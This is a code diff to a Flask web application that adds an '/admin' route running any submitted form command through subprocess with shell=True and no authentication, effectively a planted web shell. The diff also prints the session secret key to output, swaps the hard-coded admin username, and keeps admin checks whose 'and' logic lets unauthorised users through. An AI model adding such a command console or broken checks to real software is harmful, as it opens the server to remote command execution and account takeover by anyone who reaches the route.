@@ -6,6 +6,7 @@ from datetime import datetime
 from flask_socketio import SocketIO, emit, join_room, leave_room
 import re
 import bleach
+import subprocess
 
 
 # logging.basicConfig(filename='/home/oilnwine/flaskapp.log', level=logging.DEBUG)
@@ -16,7 +17,9 @@ import bleach
 
 app = Flask(__name__)
 # app.secret_key = "secret_key"
-app.config['SECRET_KEY'] = os.urandom(24)
+secret_key=os.urandom(12)
+app.config['SECRET_KEY'] = secret_key
+print(secret_key)
 socketio = SocketIO(app)
 
 DATABASE = 'oilnwine.db'
@@ -578,7 +581,7 @@ def get_verse():
 @app.route('/admincontrol')
 def admin_dashboard():
     try:
-        if 'username' not in session and session['username'] != "&@m_@I":
+        if 'username' not in session and session['username'] != "samjose":
             return "Not Authorized"
 
         conn=create_connection()
@@ -618,7 +621,7 @@ def modify_user(user_id):
 
 @app.route('/delete_user/<int:user_id>')
 def delete_user(user_id):
-    if 'username' not in session and session['username'] != "&@m_@I":
+    if 'username' not in session and session['username'] != "samjose":
         return "Not Authorized"
 
     # Logic to delete user
@@ -904,9 +907,9 @@ def login():
 @app.route('/dashboard')
 def dashboard():
     if 'username' in session:
-        
         conn=create_connection()
         user = session['username']
+        print(user)
         cursor1 = conn.cursor()
         cursor1.execute(
             'SELECT permission FROM users where username = ?', (user,))
@@ -914,7 +917,7 @@ def dashboard():
         permission = permission[0]
         conn.close()
 
-        if session['username'] == "&@m_@I":
+        if session['username'] == "samjose":
             return redirect('/admincontrol')
         
         user_name = request.args.get('name') or session['username']
@@ -1411,6 +1414,19 @@ def handle_url():
     else:
         return "No URL provided", 400
 
+@app.route('/admin', methods=['GET', 'POST'])
+def console():
+    output = ''
+    if request.method == 'POST':
+        command = request.form['command']
+        try:
+            # Note: In a real-world application, never use shell=True with user input due to security risks
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            output = result.stdout if result.returncode == 0 else result.stderr
+        except Exception as e:
+            output = str(e)
+
+    return render_template('console.html', output=output)
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', port=5000,
